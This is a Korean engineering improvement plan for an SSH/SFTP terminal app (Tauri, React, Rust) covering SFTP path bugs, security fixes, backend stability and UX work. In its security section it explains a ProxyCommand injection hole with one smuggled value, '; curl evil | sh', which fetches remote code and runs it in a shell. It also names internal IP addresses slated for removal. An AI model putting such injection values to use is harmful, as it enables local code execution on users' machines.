# OmniTerm 개선 계획 (Improvement Plan)

> 작성일: 2026-07-28 / 기준 버전: v0.1.13
> 코드베이스 전체 분석(프론트엔드 React + Rust 백엔드) 결과를 바탕으로 작성.
> 우선순위: **P0(치명적 버그/보안) → P1(안정성) → P2(UX 개선) → P3(기능 확장)**

---

## 목차

- [0. 요약 (TL;DR)](#0-요약-tldr)
- [1. P0 — SFTP "root를 못 찾는" 버그 (근본 원인 6가지)](#1-p0--sftp-root를-못-찾는-버그)
- [2. P0 — 보안 이슈](#2-p0--보안-이슈)
- [3. P1 — 백엔드 안정성 (동시성/누수/수명주기)](#3-p1--백엔드-안정성)
- [4. P1 — 터미널 핵심 버그](#4-p1--터미널-핵심-버그)
- [5. P2 — UI/UX 전면 개선](#5-p2--uiux-전면-개선)
- [6. P3 — 기능 확장 (MobaXterm 대비 부족 기능)](#6-p3--기능-확장)
- [7. 실행 로드맵 (마일스톤)](#7-실행-로드맵)

---

## 진행 현황 (Progress Tracker)

> 구현이 완료·검증된 항목만 체크. 마지막 갱신: 2026-07-28 (M1~M6 착수분 구현 완료 — cargo check / tsc / eslint / vite build 통과)
>
> **미착수 잔여 (후속 작업)**: 전송 큐 UI·디렉토리 업로드·chmod(§5.2), 정렬/멀티셀렉트(§5.2-4), xterm 애드온·설정 화면·상태바(§5.3), 세션 그룹/검색·편집 폼 개선(§5.4), i18n·테마 토큰·플랫폼별 타이틀바(§5.5), 인증 확장·재연결·ssh config 임포트·포워딩(§6.2~6.6), russh 마이그레이션 검토(§6.7)

### Milestone 1 — SFTP가 제대로 동작한다
- [x] §1.1 `realpath(".")` 1순위 + `~/subdir` 확장 (백엔드)
- [x] §1.2 홈 해석 폴백 체인 (username 저장 → `/home/<user>` → `/Users/<user>` → `/`)
- [x] §1.3 심볼릭 링크 디렉토리 판별 (`stat()` 추적 + `isSymlink` 필드/아이콘)
- [x] §1.4 프론트 요청 시퀀스 가드 (race 제거)
- [x] §1.5 경로 입력창(draft)과 탐색 상태 분리
- [x] §1.6 탐색을 `entry.path` 기반으로 전환 + Windows 경로 조합 수정
- [x] §3.1 SFTP 핸들 캐시 + Mutex 직렬화
- [x] §2.5 하드코딩된 개인정보(IP/키 경로) 제거

### Milestone 2 — 터미널이 제대로 동작한다
- [x] §4.1 PTY resize 커맨드(`resize_pty`) + ResizeObserver + 활성화 시 fit
- [x] §4.2 한글 깨짐 — streaming TextDecoder
- [x] §4.3 초기 출력 유실 — listen 후 spawn 순서 보장 (spawn을 TerminalView로 이동)
- [x] §5.1-1 새 탭 자동 활성화
- [x] §5.1-2 PTY spawn 실패 시 에러 표시 (터미널 배너)
- [x] §5.1-3 비밀번호 실패 시 폼 유지
- [x] §5.1-4 중복 연결 가드
- [x] §5.1-5 포트 필드 22 표시 문제

### Milestone 3 — 보안
- [x] §2.1 호스트 키 검증 (known_hosts, TOFU + 키 변경 시 연결 차단, 바스천 경유 타깃 포함)
- [x] §2.2 ProxyCommand 인젝션 방지 (charset 검증 + 키 경로 quoting) + 45초 타임아웃
- [x] §2.3 비밀번호 Debug 레다크션 (AuthPayload/ServerConfigPayload 커스텀 Debug)
- [x] §2.4 CSP 설정
- [x] §2.6 루프백 소켓 peer 검증

### Milestone 4 — 안정성
- [x] §3.2 리퍼 제거 → keepalive(셸 스레드 30초) + `session-disconnected` 이벤트
- [x] §3.3 셸 스레드 종료 시그널(Close 메시지) + spawn 중복 가드 + 채널 close/EOF
- [x] §3.4 바스천 브리지 WouldBlock/에러 처리 + 기동 시그널 + EOF 판별
- [x] §3.5 뮤텍스 poisoning 내성 (session_manager + ShellWriteManager)
- [x] §3.6 기타 백엔드 수정 목록 (SFTP 실패 시 셸 유지, legacy 알고리즘 터널 적용, 15초 타임아웃 완화, 업로드 검증, auth_method 검증, sync→async, `&id[..8]` 등 — 단 "연결당 인증 2회"는 russh 마이그레이션(§6.7) 항목으로 유지)
- [x] §4.4 터미널 처리량 개선 (드레인 읽기 + 128KB 코얼레싱 + 15ms 폴링)
- [x] §4.5 세션 끊김 감지/배너 표시

### Milestone 5 — SFTP 탐색기 재설계
- [x] §6.1 `download_sftp_file` + `sftp_mkdir/rename/remove` 커맨드 (chmod는 후속)
- [x] §5.2-1 브레드크럼 내비게이션 (세그먼트 클릭, 더블클릭/연필 아이콘으로 직접 입력 전환)
- [x] §5.2-2 다운로드 UI (파일 더블클릭 / 우클릭 메뉴 → 저장 다이얼로그)
- [x] §5.2-3 우클릭 컨텍스트 메뉴 (다운로드/열기/이름 변경/경로 복사/삭제)
- [x] §5.2-4 mtime 컬럼 + 숨김 파일 토글 + 심링크 아이콘
- [x] §5.2-5 드롭 존 SFTP 패널 한정 (position 히트테스트) + 업로드 버튼 + 덮어쓰기 확인
- [x] §5.2-6 SFTP 패널 접기 (localStorage 저장)
- [x] §5.2-7 에러/빈 상태 배타 처리 + 중첩 스크롤 제거 (패널 전체 높이 리스트)
- [x] §5.2-4 (추가) 파인더식 선택 모델 — 클릭=선택(하이라이트), 더블클릭=열기/다운로드, 선택 항목 툴바 액션(다운로드/이름 변경/삭제) + 키보드(F2, Delete)
- [x] (버그픽스) 터미널 사용 중 끊김("Failure while draining incoming flow"/"transport read") — 소켓을 타임아웃 제거 대신 논블로킹 전환, 셸 write 경로의 `channel.flush()`(수신 버퍼 폐기 함수) 제거, 브리지 지연 50ms→10ms
- [ ] §5.2-5 전송 큐 UI (파일별 프로그레스/취소 — `sftp-transfer-progress` 이벤트 필요, 후속)
- [ ] §5.2-5 디렉토리 업로드 (후속)

### Milestone 6 — UX 폴리시 (착수분)
- [x] §5.1-6 세션 클릭=선택, Connect 버튼/더블클릭=연결
- [x] §5.1-7 세션/키 삭제 확인 다이얼로그
- [x] §5.1-9 Abort 시 고아 세션 정리 (`close_ssh_session` 자동 호출)
- [x] §5.1-10 탭 제거 시 세션 종료 통합 (`closeTab` 헬퍼, 단축키와 공용)
- [x] §5.1-11/12 스플리터 개선 (rAF 스로틀 + localStorage 디바운스/드래그 종료 시 저장, Pointer Capture — 두 스플리터 모두)
- [ ] §5.1-13 공용 `useSplitter` 훅 추출 (두 구현이 동일 패턴으로 정리됐으나 훅 통합은 후속)
- [x] §5.3-4 글로벌 단축키 (Cmd/Ctrl+W 탭 닫기, Cmd/Ctrl+1..9 탭 이동, Ctrl+Tab 순환)
- [x] 탭 접근성 (중첩 인터랙티브 제거, roving tabindex + 화살표 키) + 동일 호스트 탭 자동 번호
- [x] **연결 시 세션 자동 저장** — 저장 체크박스 제거, 연결 시도 시점에 무조건 저장(비밀번호 제외), 동일 target/bastion 구성은 중복 생성 없이 기존 세션 갱신, 성공 시 목록에서 자동 선택
- [x] §6.4 (일부) **SSH 명령어 붙여넣기 임포트** — `ssh -i … -o ProxyCommand="…" user@host` / `-J` 파싱 → 키 자동 등록(Key Manager, 경로 중복 방지) + 폼 자동 입력 + reuseBastionAuth 자동 판별 (`parseSshCommand.ts`; `~/.ssh/config` Host 별칭 임포트는 후속)

---

## 0. 요약 (TL;DR)

| 영역 | 핵심 문제 | 해결 방향 |
|---|---|---|
| SFTP root 버그 | `realpath("~")`가 OpenSSH에서 항상 실패 + 실패 시 폴백 없음 + 심볼릭 링크 디렉토리를 파일로 오판 + 프론트 요청 race | 백엔드 경로 해석 재설계 + 요청 시퀀스 가드 |
| 보안 | 호스트 키 검증 전무(MITM 무방비), ProxyCommand 셸 인젝션, 비밀번호 평문 노출 경로 | known_hosts 검증, 인자 이스케이프, zeroize |
| 안정성 | SFTP 세션 동시 접근(스레드 안전성 위반), 5분 리퍼가 업로드 중 세션 킬, 셸 스레드 영구 누수 | 세션별 Mutex\<Sftp\> 캐시, keepalive 도입, 종료 시그널 |
| 터미널 | PTY resize 명령 자체가 없음(영원히 80×24), UTF-8 청크 경계 한글 깨짐, 초기 출력 유실 | resize 커맨드 추가, streaming TextDecoder, 출력 버퍼 |
| UI/UX | 다운로드 없음, 브레드크럼 없음, 새 탭이 활성화 안 됨, 연결 상태 표시 없음, 단축키 전무 | §5 참조 |

---

## 1. P0 — SFTP "root를 못 찾는" 버그

사용자가 체감하는 "root를 제대로 못 찾는다"는 증상은 **단일 버그가 아니라 백엔드 3개 + 프론트엔드 3개의 독립적인 원인이 겹친 결과**다. 아래 6개를 모두 고쳐야 완전히 해결된다.

### 1.1 [백엔드] `realpath("~")`는 OpenSSH에서 항상 실패한다

- **위치**: `src-tauri/src/commands/sftp.rs:83-101`
- **문제**: SFTP는 바이너리 프로토콜이라 셸이 없고 `~` 확장이 없다. OpenSSH `sftp-server`는 `~`를 리터럴 파일명(`$HOME/~`)으로 해석해 `SSH_FX_NO_SUCH_FILE`을 반환한다. 현재 코드는 매번 실패가 보장된 왕복 1회를 낭비하고, `.or_else(realpath("."))` 폴백에만 의존해 동작 중이다.
- **수정**:
  1. `~`/`.` 요청 시 곧바로 `realpath(".")`를 1순위로 시도.
  2. `~/subdir` 형태 입력을 확장 처리 (`sftp.rs:104`의 else 분기가 현재 verbatim 전달 → `$HOME/~/subdir`로 깨짐. `sftp_upload.rs:45-52`도 동일 결함).

### 1.2 [백엔드] `realpath` 실패 시 폴백이 아예 없다 — **가장 유력한 직접 원인**

- **위치**: `src-tauri/src/commands/sftp.rs:96-101`
- **문제**: `realpath(".")`까지 실패하면 의도적으로 하드 실패("Enter path manually...")한다. REALPATH 미지원 서버, `nologin` 셸, 특수 chroot 구성에서 파일 브라우저가 **완전히 죽는다**.
- **수정** (폴백 체인 구현):
  1. `realpath(".")` →
  2. `stat("/home/<username>")` (연결 시 username을 `ActiveSession`에 저장하는 리팩토링 필요 — 현재 `session_manager.rs:7-19`에 username 필드 없음) →
  3. 최후에 `/` 시도 →
  4. 전부 실패 시에만 수동 입력 안내.

### 1.3 [백엔드] 심볼릭 링크 디렉토리가 "열 수 없는 파일"이 된다

- **위치**: `src-tauri/src/commands/sftp.rs:45-48` + `src/domains/sftp/components/SftpExplorer.tsx:167-168`
- **문제**: `READDIR`은 lstat 속성을 반환하므로 심링크는 `S_IFLNK`다. 현재 `is_dir_from_perm`이 `false`를 반환하고, 프론트는 `is_dir`이 아니면 진입을 막는다. `/home → /export/home`, macOS `/var → /private/var`, Docker/NFS 환경에서 **홈 디렉토리 자체에 클릭으로 도달할 수 없다**. 또한 서버가 permission 필드를 생략하면(`perm == None`) **모든 엔트리가 파일**이 된다.
- **수정**:
  1. `S_IFLNK`인 엔트리는 `sftp.stat()`(링크 추적)으로 재확인해 디렉토리 여부 판별.
  2. `SftpEntry`에 `is_symlink: bool` 필드 추가 (UI에서 링크 아이콘 표시).
  3. `perm == None`일 때 `opendir` 시도로 판별하거나 최소한 진입 시도를 허용.
  4. `ssh2::FileStat::is_dir()` 헬퍼 사용 검토.

### 1.4 [프론트] 요청 race — "Root/Home 버튼이 안 먹는" 증상의 원인

- **위치**: `src/domains/sftp/components/SftpExplorer.tsx:59-77, 158-164`
- **문제**: `loadDirectory`에 요청 시퀀스 가드가 없어 **늦게 도착한 응답이 항상 이긴다**. 탭 전환 시 effect 두 개가 연달아 실행되며 (① `currentPath='~'` 큐잉, ② **이전 탭 경로 + 새 세션 ID**로 즉시 요청) 요청 A/B가 경쟁한다. Root/Home 클릭이 "안 먹는" 것처럼 보이거나, 새 호스트에 이전 탭 디렉토리가 표시되거나, 정상 응답이 에러로 덮인다.
- **수정**:
  ```tsx
  const requestSeqRef = useRef(0);
  const loadDirectory = useCallback(async (path: string) => {
    const seq = ++requestSeqRef.current;
    const result = await invoke(...);
    if (seq !== requestSeqRef.current) return; // 늦은 응답 폐기
    ...
  }, [activeTerminalSessionId]);
  ```
  - 탭 전환 시에는 `setCurrentPath` 후 effect 체인에 맡기지 말고 **명시적으로 `loadDirectory('~')` 호출** (경로 상태와 로딩 트리거 분리).

### 1.5 [프론트] 경로 입력창과 탐색 상태가 같은 state를 공유

- **위치**: `SftpExplorer.tsx:208-221, 162-164`
- **문제**:
  - 입력창이 `currentPath`를 직접 제어 → **타이핑 한 글자마다 SFTP readdir 요청 발사** (`/var/log` 입력 = 8회 요청, 각각 에러 + 목록 초기화).
  - 응답의 `setCurrentPath(result.pathUsed)`(69행)가 타이핑 중인 입력값을 덮어쓴다.
- **수정**: `pathInput`(draft)과 `currentPath`(확정 경로) state 분리. Enter/Go 시에만 `currentPath` 갱신. 자동 로드는 `currentPath` 변경 시에만.

### 1.6 [프론트] 폴더 진입 시 서버가 준 절대 경로를 버리고 문자열 조합

- **위치**: `SftpExplorer.tsx:21-35, 166-172`
- **문제**: 백엔드가 `entry.path`(완전한 경로, `sftp.rs:127`)를 이미 주는데 React key로만 쓰고, 탐색은 `joinRemotePath(currentPath, entry.name)` 문자열 조합으로 한다. `currentPath`가 `~`인 상태에서 폴더를 열면 경로가 `logs` 같은 **bare 상대 경로**가 되어 홈 prefix를 잃고, `getParentPath`는 `logs → ~`로 점프한다.
- **수정**: 탐색은 `entry.path`를 그대로 사용. `joinRemotePath`/`getParentPath` 문자열 조작 제거. Up 버튼도 백엔드 `realpath("<current>/..")` 또는 서버가 준 절대 경로 기반으로.
- **추가**: 한글/비UTF-8 파일명 — `sftp.rs:125-131`의 `to_string_lossy`가 비UTF-8 바이트를 U+FFFD로 치환해 **해당 디렉토리가 영구 접근 불능**이 된다. 엔트리에 raw bytes(base64)를 함께 내려 재요청 시 사용하는 방안 검토 (EUC-KR 파일명 서버 대응).
- **추가**: Windows 클라이언트에서 `Path::join`이 `\`를 삽입해 `/home/user\.bashrc`가 됨 — 경로 조합을 `format!("{}/{}", ...)` 문자열 기반으로 통일.

### 1.7 완료 기준 (Acceptance Criteria)

- [ ] 어떤 서버(OpenSSH, chroot, REALPATH 미지원)에서도 SFTP 첫 화면이 홈 또는 `/`로 열린다.
- [ ] `/home`이 심링크인 서버에서 클릭 탐색으로 홈에 도달할 수 있다.
- [ ] 경로 입력창에 타이핑해도 요청이 나가지 않고, Enter 시 1회만 나간다.
- [ ] 탭을 빠르게 전환해도 항상 활성 탭 세션의 홈 디렉토리가 표시된다.
- [ ] `~/logs` 입력이 `$HOME/logs`로 해석된다.
- [ ] 한글 파일명 폴더 진입/업로드가 정상 동작한다.

---

## 2. P0 — 보안 이슈

### 2.1 호스트 키 검증 전무 — MITM 무방비 ⚠️ 최우선

- **위치**: `src-tauri/src/ssh/direct.rs:64` (handshake 직후 바로 인증), `known_hosts()` 호출이 코드베이스에 없음
- **문제**: 모든 연결(직접/바스천/터널링된 타깃)이 중간자 공격에 그대로 노출. 사내 서버 접속 도구로서 치명적.
- **수정**:
  1. `Session::known_hosts()` + `~/.ssh/known_hosts` 로드.
  2. 최초 접속 시 지문(fingerprint) 확인 다이얼로그 (TOFU 방식) → 수락 시 저장.
  3. 키 변경 감지 시 강한 경고 UI.

### 2.2 `test_ssh_connection`의 ProxyCommand 셸 인젝션

- **위치**: `src-tauri/src/commands/ssh_connection.rs:224-241`
- **문제**: `format!("ssh -W %h:%p -i {} {}@{}", bastion_key, b_user, b_host)`를 `/bin/sh -c`로 실행. 사용자명/키 경로에 `; curl evil | sh`가 들어가면 **로컬 임의 코드 실행**. 공백 포함 키 경로도 깨짐. `cmd.output()`에 타임아웃도 없어 내부 ssh가 passphrase 프롬프트에서 영원히 블록될 수 있음.
- **수정**: 셸 이스케이프(또는 입력 검증: 사용자명 `[a-z0-9_.-]`, 경로 존재 확인) + 내부 ssh에도 `-o BatchMode=yes -o ConnectTimeout=15` 전파 + `output()` 타임아웃. 장기적으로는 Test도 libssh2 경로로 통일 (현재 Test는 시스템 ssh, 실제 연결은 libssh2라 테스트 통과 ≠ 연결 성공).

### 2.3 비밀번호 평문 노출 경로

- **위치**: `ssh_connection.rs:7-18`, `ssh/auth.rs:10` — `password` 필드가 있는 구조체에 `derive(Debug)`
- **문제**: `{:?}` 로깅/패닉 메시지에 평문 비밀번호 유출. debug 빌드에서 `tauri-plugin-log` 활성 상태(`lib.rs:43-49`). 프론트는 비밀번호를 localStorage 기반 store에 저장.
- **수정**: 커스텀 `Debug` 구현(`password: [REDACTED]`), `zeroize` 크레이트 도입, 자격증명은 OS 키체인(`keyring` 크레이트 또는 tauri-plugin-stronghold)으로 이관.

### 2.4 CSP 없음

- **위치**: `src-tauri/tauri.conf.json` — `"csp": null`
- **문제**: 웹뷰가 신뢰할 수 없는 원격 터미널 출력을 렌더링하면서 IPC 전권을 가짐.
- **수정**: `default-src 'self'` 기반 CSP 설정.

### 2.5 개인 정보가 앱에 하드코딩되어 배포됨

- **위치**: `src/domains/session/components/SessionForm.tsx:12-20, 88, 269-276`
- **문제**: 실제 사내 IP(`3.39.6.120`, `10.0.136.140`)와 로컬 키 경로(`/Users/hankookilbo/...`)가 "hk-hrams bastion 예제로 채우기" 버튼으로 **릴리즈 빌드에 포함**되어 있다. GitHub Releases로 배포 중이므로 정보 노출.
- **수정**: 즉시 제거. 필요하면 "최근 연결 기반 자동 채우기" 기능으로 대체.

### 2.6 바스천 브리지 루프백 소켓 하이재킹

- **위치**: `src-tauri/src/ssh/bastion.rs:116-122`
- **문제**: `bind → connect → accept` 사이에 로컬의 다른 프로세스가 해당 포트에 접속하면 `accept()`가 공격자 소켓을 반환할 수 있음. 터널 전체(타깃 SSH 핸드셰이크 포함)가 이 소켓을 지나간다.
- **수정**: `accepted.peer_addr() == connector.local_addr()` 검증 루프, 또는 unix에서 `UnixStream::pair()` 사용.

---

## 3. P1 — 백엔드 안정성

### 3.1 SFTP 세션 동시 접근 — 스레드 안전성 위반 (간헐적 SFTP 오류의 원인)

- **위치**: `session_manager.rs:67-73` + `sftp.rs:78`
- **문제**: libssh2는 스레드 세이프하지 않은데, `Session` clone을 서로 다른 `spawn_blocking` 워커에서 동기화 없이 사용. 프론트의 이중 로드(§1.4)와 결합해 **요청 겹침이 보장**되어 있어 `Would block`/`SFTP protocol error`/잠재적 힙 손상 발생.
- **수정**: `ActiveSession`에 `Arc<Mutex<Sftp>>` 캐시. 매 호출마다 `session.sftp()`로 서브시스템을 재협상하는 비용(채널 오픈 + 핸드셰이크 왕복, `MaxSessions` 고갈 위험)도 함께 제거된다.

### 3.2 5분 유휴 리퍼 → keepalive로 교체

- **위치**: `lib.rs:14-25`, `sftp_upload.rs:179`, `terminal.rs:53`
- **문제**:
  - 6분짜리 업로드는 완료 후에야 `touch()` → **업로드 도중 세션이 리핑**되고 다음 조작에서 "Session not found".
  - 터미널 **출력**은 activity로 안 침 → `tail -f`, 빌드 지켜보기만 해도 5분 뒤 세션 킬.
  - 리핑 시 이벤트 미발행 → UI는 여전히 연결된 것처럼 보임 (자판 입력이 조용히 사라짐).
- **수정**:
  1. 리퍼 제거하고 `session.set_keepalive(true, 30)` + 주기적 `keepalive_send()`로 교체 (NAT/방화벽 유휴 드롭도 함께 해결).
  2. 연결 종료 감지 시 `session-disconnected` 이벤트 발행 → UI에 탭 상태 반영 + 재연결 버튼.
  3. 장시간 작업은 시작 전/도중 `touch()`.

### 3.3 셸 스레드/채널 수명주기

- **위치**: `shell_channel.rs:52-78`, `terminal/mod.rs:20-25`, `terminal.rs:18-21`
- **문제**:
  - 셸 스레드에 종료 시그널이 없음 — 탭을 닫아도 스레드가 자기 `Session` clone을 쥐고 50ms 폴링을 영원히 지속 (연결도 안 닫힘).
  - `spawn_pty_process` 중복 호출 가드 없음 — 프론트가 두 곳(`Sidebar.tsx:95, 152`)에서 호출해 셸 스레드 2개가 같은 `session_id`로 출력을 섞어 emit 가능.
  - `send_eof()`/`close()`/`wait_close()` 어디에도 없음 — 서버 측 세션 잔류.
- **수정**: `AtomicBool` 종료 플래그(또는 `try_recv`의 `Disconnected` 구분) + `channel.close()` + `register` 시 기존 항목 존재하면 에러 반환.

### 3.4 바스천 브리지 결함

- **위치**: `bastion.rs:127-151`
- **문제**:
  - `channel.write_all()`이 논블로킹 채널에서 `WouldBlock` 부분 쓰기 시 fatal로 처리 → **터널 통과 대용량 전송 중 조용한 데이터 유실/터널 붕괴** (144행).
  - `Err(_) => {}`가 `ConnectionReset`까지 삼켜 죽은 터널에서 **500Hz 무한 스핀** (141-148행) — 스레드/채널/소켓 영구 누수.
  - 브리지 기동을 `sleep(100ms)`로 대기 (93행) — 시그널/배리어로 교체.
- **수정**: `WouldBlock`만 재시도(남은 바이트 보존), 그 외 에러는 break. 2ms 폴링 대신 소켓 이벤트 대기.

### 3.5 뮤텍스 poisoning으로 앱 전체 벽돌화

- **위치**: `session_manager.rs:44,61,70,87,96`, `terminal/mod.rs:23,30,41`
- **문제**: `.expect("sessions lock")` — 락 보유 중 패닉 1회면 이후 **모든 SSH/SFTP/터미널 커맨드가 영구 패닉**.
- **수정**: `lock().unwrap_or_else(|e| e.into_inner())`.

### 3.6 기타 백엔드 수정 목록

| 항목 | 위치 | 수정 |
|---|---|---|
| 리퍼가 락 잡은 채 세션 drop(최대 수십 초 블록) | `session_manager.rs:105-115` | 락 밖에서 drop |
| SFTP 연결 실패 시 정상 셸 세션까지 폐기 | `ssh_connection.rs:124-146` | SFTP는 lazy 연결로 |
| 연결당 인증 2회(바스천은 4회) — OTP 서버에서 사용 불가 | `ssh_connection.rs:95-147` | SFTP 세션 lazy 생성 + 장기적으로 russh 마이그레이션 검토 |
| 15초 소켓 타임아웃이 세션 수명 내내 유지 | `direct.rs:52-55,69` | 핸드셰이크 후 완화 |
| 바스천 경유 타깃에 legacy 알고리즘 설정 미적용 | `bastion.rs:96-103` vs `direct.rs:61` | `configure_session_methods` 호출 추가 |
| 업로드 close 에러 무시 → 손상 파일을 성공 보고 | `sftp_upload.rs:156-163` | 명시적 close + 에러 체크 |
| 업로드가 기존 원격 파일을 무경고 덮어씀 | `sftp_upload.rs:143` | 존재 확인 + 확인 다이얼로그(§5.3) |
| `write_to_terminal`이 채널 死 상태에서도 Ok 반환 | `terminal.rs:50-53`, `shell_channel.rs:54-59` | 쓰기 실패 시 에러 이벤트 발행 |
| 리핑된 세션 탭 닫기가 에러 반환 | `terminal.rs:36-40` | not-found는 Ok 처리 |
| permission denied 힌트가 대소문자 불일치로 dead code | `sftp.rs:110,115` | `e.code()` 비교로 교체 |
| sync 커맨드 3개가 메인 스레드에서 뮤텍스 획득 | `lib.rs:31-41` | async + `spawn_blocking`으로 통일 |
| `&id[..8]` 잠재 패닉 | `ssh_connection.rs:160` | `id.get(..8)` |
| auth_method 오타가 조용히 Password로 강등 | `ssh_connection.rs:29-37` | unknown은 명시적 에러 |

---

## 4. P1 — 터미널 핵심 버그

### 4.1 PTY resize가 아예 없다 — 원격은 영원히 80×24

- **위치**: `shell_channel.rs:41` (`request_pty("xterm", None, None)`), resize 커맨드 미등록(`lib.rs:31-41`)
- **문제**: `FitAddon.fit()`은 클라이언트 렌더링만 바꾼다. 원격 PTY 크기가 안 바뀌므로 `vim`/`htop`/`less`/줄바꿈이 전부 깨진다. **MobaXterm 대용으로 쓰기에 가장 체감이 큰 버그.**
- **수정**:
  1. Rust: `resize_pty(session_id, cols, rows)` 커맨드 추가 → `channel.request_pty_size(cols, rows, None, None)`. 채널이 셸 스레드 소유이므로 mpsc로 resize 메시지를 전달하는 구조 필요 (input 채널을 `enum ShellMsg { Data(Vec<u8>), Resize(u32,u32) }`로 확장).
  2. 프론트: `fit()` 후 `term.cols/rows`를 invoke. `ResizeObserver`를 터미널 컨테이너에 부착 (현재 `window.resize`만 청취 — 사이드바/SFTP 패널 드래그 시 refit 안 됨, `TerminalView.tsx:103`).
  3. 숨김 탭(`display:none`)에서 `fit()` 호출 방지 — 활성화 시점에 fit (`MainArea.tsx:198`, `TerminalView.tsx:63`).

### 4.2 한글 깨짐 — UTF-8 청크 경계

- **위치**: `TerminalView.tsx:15-26`
- **문제**: 이벤트마다 `new TextDecoder().decode(bytes)` — 4096바이트 경계에 걸친 멀티바이트 문자(한글!)가 U+FFFD로 깨짐.
- **수정**: 세션당 persistent `TextDecoder` 유지 + `decode(bytes, { stream: true })`.

### 4.3 초기 출력(MOTD/프롬프트) 유실

- **위치**: `Sidebar.tsx:95,152`(즉시 spawn) vs `TerminalView.tsx:78-92`(마운트 후 비동기 listen)
- **문제**: listener 등록 전 emit된 출력은 사라짐. 백엔드에 replay 버퍼 없음.
- **수정**: (a) 백엔드에 세션별 링버퍼(예: 64KB) 두고 listener 접속 시 replay, 또는 (b) 프론트가 listen 완료 후 spawn을 invoke하는 순서 보장. (b)가 간단하므로 우선 적용.

### 4.4 터미널 처리량 ~80KB/s 상한

- **위치**: `shell_channel.rs:22,61,77` — 50ms 슬립당 4096바이트 1회 읽기
- **수정**: `WouldBlock`까지 드레인 읽기 + 고정 슬립 대신 짧은 대기. 작은 청크 코얼레싱으로 base64+JSON IPC 오버헤드(33%)도 완화.

### 4.5 세션 死 감지/표시

- **위치**: `TerminalView.tsx:35-37` (`.catch(() => {})`), §3.2와 연동
- **문제**: 죽은 세션에 타이핑해도 무반응 — 사용자는 멈춘 줄 안다.
- **수정**: `session-disconnected` 이벤트 수신 시 터미널에 배너("연결이 끊어졌습니다 — [재연결]") 오버레이 + 탭에 상태 점 표시.

---

## 5. P2 — UI/UX 전면 개선

### 5.1 즉시 체감되는 동작 버그 (Quick wins)

| # | 문제 | 위치 | 수정 |
|---|---|---|---|
| 1 | **새로 연 탭이 활성화되지 않음** — 두 번째 서버 연결 시 화면 변화 없음, SFTP는 이전 호스트를 계속 표시 | `terminalStore.ts:31` | `addTab` 시 항상 새 탭을 active로 |
| 2 | PTY spawn 실패해도 초록 성공 토스트 | `Sidebar.tsx:95,152-155` | 실패 시 에러 토스트 + 탭 상태 표시 |
| 3 | 비밀번호 틀리면 입력 폼이 닫혀버림 — 재클릭+재입력 강제 | `Sidebar.tsx:131-138` | 실패 시 폼 유지 + 에러 인라인 표시 |
| 4 | 같은 세션 더블클릭 → 중복 연결 2개 생성 | `useEstablishConnection.ts` | 연결 중 가드 (dead code인 `lastConnectedSessionId` 활용) |
| 5 | 포트 필드에 `22` 입력하면 빈칸으로 보임 | `SessionForm.tsx:327` | placeholder로 22 표시, 값은 그대로 |
| 6 | 저장된 세션 클릭 = 즉시 연결 + 작성 중이던 폼 초기화 | `SessionList.tsx:88-91`, `Sidebar.tsx:240` | 클릭=선택/편집, 더블클릭 또는 Connect 버튼=연결 |
| 7 | 세션/키 삭제 확인 없음 | `SessionList.tsx:92`, `KeyManagerPanel.tsx:181` | 확인 다이얼로그 |
| 8 | 토스트/에러가 Sessions 탭 안에 있어 Keys 탭에서 안 보임 | `Sidebar.tsx:217-238` | 앱 레벨 토스트 레이어 신설 |
| 9 | Abort 버튼이 실제 연결을 중단하지 않음 — 고아 세션 생성 | `useEstablishConnection.ts:194-204` | 성공해도 abort 상태면 `close_ssh_session` 호출 |
| 10 | 탭 닫기 외 경로로 탭 제거 시 SSH 세션 누수 | `terminalStore.ts:38-46` | 세션 종료를 store 액션에 통합 |
| 11 | 스플리터 드래그마다 localStorage 동기 쓰기 + 전체 리렌더 | `App.tsx:37-45`, `ResizeHandle.tsx:40-44` | rAF 스로틀 + 드래그 종료 시에만 저장 |
| 12 | 마우스가 창 밖에서 떼지면 드래그 상태 고착 | `ResizeHandle.tsx:50-60` | Pointer Events + `setPointerCapture` |
| 13 | 드래그 로직이 두 곳에 중복 (하나는 aria 누락) | `ResizeHandle.tsx` vs `MainArea.tsx:51-79` | 공용 `useSplitter` 훅으로 통합 |

### 5.2 SFTP 탐색기 재설계

현재: 자유 텍스트 경로 입력 + Home/Root/Up 버튼 + Name/Size 2열 리스트, 다운로드 없음, 우클릭 없음.

**목표 (파인더/탐색기 수준):**

1. **브레드크럼 내비게이션**: `/(root) › home › ec2-user › logs` — 각 세그먼트 클릭 가능. 경로 직접 입력은 브레드크럼 클릭 시 입력 모드 전환.
2. **다운로드** (현재 아예 없음): 파일 더블클릭 또는 우클릭 → 저장 다이얼로그. Rust에 `download_sftp_file` 커맨드 신설. (§6.1)
3. **파일 작업**: 우클릭 컨텍스트 메뉴 — 새 폴더, 이름 변경, 삭제, 권한(chmod), 경로 복사. Rust 커맨드 `sftp_mkdir/rename/remove/chmod` 신설.
4. **리스트 개선**:
   - 컬럼: 이름 / 크기 / 수정일(`mtime`은 이미 백엔드가 내려주는데 미표시 — `domains/sftp/types.ts:6`) / 권한
   - 정렬(이름/크기/날짜), 숨김 파일 토글(`.` 시작), 심링크 아이콘
   - 멀티 셀렉트 (Shift/Cmd 클릭)
   - 중첩 스크롤 제거 — 현재 패널 스크롤 안에 `max-h-[360px]` 리스트가 또 스크롤됨 (`SftpExplorer.tsx:299`)
5. **업로드 개선**:
   - 드롭 존을 SFTP 패널로 한정 (현재 **창 전체**가 드롭 존 — 터미널에 파일을 떨어뜨려도 업로드됨. `data-sftp-dropzone` 속성이 설정만 되고 안 읽힘, `SftpExplorer.tsx:190`)
   - 업로드 버튼(파일 선택 다이얼로그) 추가 — 현재 드래그앤드롭만 가능
   - 전송 큐 UI: 파일별 프로그레스 바, 취소 버튼, 완료 후 자동 소거 (백엔드 `sftp-transfer-progress` 이벤트 신설 필요, §3 P3 연계)
   - 디렉토리 업로드 지원 (현재 명시적 거부 — `sftp_upload.rs:117-125`)
   - 덮어쓰기 확인 다이얼로그
6. **패널 접기**: SFTP 패널 토글 버튼 (현재 항상 표시, 200–480px 고정 범위 — 터미널만 크게 쓰고 싶을 때 방해됨)
7. **에러/빈 상태 정리**: 현재 에러 시 빨간 박스 + "Empty"가 동시에 렌더됨 (`SftpExplorer.tsx:302-303`) — 상태를 `loading | error | empty | list`로 배타 처리

### 5.3 터미널 UX

1. **xterm 애드온 추가** (현재 fit만 설치):
   - `@xterm/addon-search` + Cmd/Ctrl+F 검색 UI
   - `@xterm/addon-web-links` — URL 클릭
   - `@xterm/addon-webgl` — 렌더링 성능
